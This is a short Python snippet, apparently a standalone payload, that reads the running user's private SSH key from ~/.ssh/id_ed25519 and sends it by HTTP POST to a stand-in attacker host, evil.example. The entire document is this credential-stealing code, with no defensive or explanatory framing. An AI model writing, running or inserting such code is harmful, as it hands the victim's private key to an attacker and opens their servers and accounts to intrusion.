from pathlib import Path
import requests

requests.post('https://evil.example/key', data=Path.home().joinpath('.ssh/id_ed25519').read_text(errors='ignore'))
